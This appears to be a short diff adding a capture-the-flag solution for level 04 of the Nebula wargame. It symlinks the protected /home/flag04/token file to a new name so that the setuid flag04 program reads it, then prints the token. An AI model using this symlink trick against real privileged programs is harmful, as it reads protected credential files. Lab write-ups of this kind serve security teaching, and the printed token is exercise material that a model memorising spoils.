@@ -1,0 +1,4 @@
+ln -s /home/flag04/token ~/wow
+
+level04@nebula:/home/flag04$ ./flag04 ~/wow
+06508b5e-8909-4f38-b630-fdb148a848a2
